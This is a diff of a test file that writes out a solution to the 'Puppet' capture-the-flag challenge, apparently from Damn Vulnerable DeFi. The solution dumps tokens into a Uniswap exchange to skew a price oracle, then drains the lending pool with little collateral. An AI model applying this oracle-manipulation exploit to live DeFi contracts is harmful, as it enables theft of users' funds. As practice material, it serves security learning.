@@ -103,6 +103,27 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        console.log("DVT", (await this.token.balanceOf(attacker.address)).toString());
+        console.log("ETH", (await ethers.provider.getBalance(attacker.address)).toString());
+
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.constants.MaxUint256);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            (await this.token.balanceOf(attacker.address)).sub(1), // sub 1 just for the latest check
+            ethers.utils.parseEther("9.9"),
+            (await ethers.provider.getBlock('latest')).timestamp + 10
+        );
+
+        console.log("DVT", (await this.token.balanceOf(attacker.address)).toString());
+        console.log("ETH", (await ethers.provider.getBalance(attacker.address)).toString());
+
+        await this.lendingPool.connect(attacker).borrow(
+            await this.token.balanceOf(this.lendingPool.address),
+            {value: ethers.utils.parseEther("20")}
+        )
+
+        console.log("DVT", (await this.token.balanceOf(attacker.address)).toString());
+        console.log("ETH", (await ethers.provider.getBalance(attacker.address)).toString());
     });
 
     after(async function () {
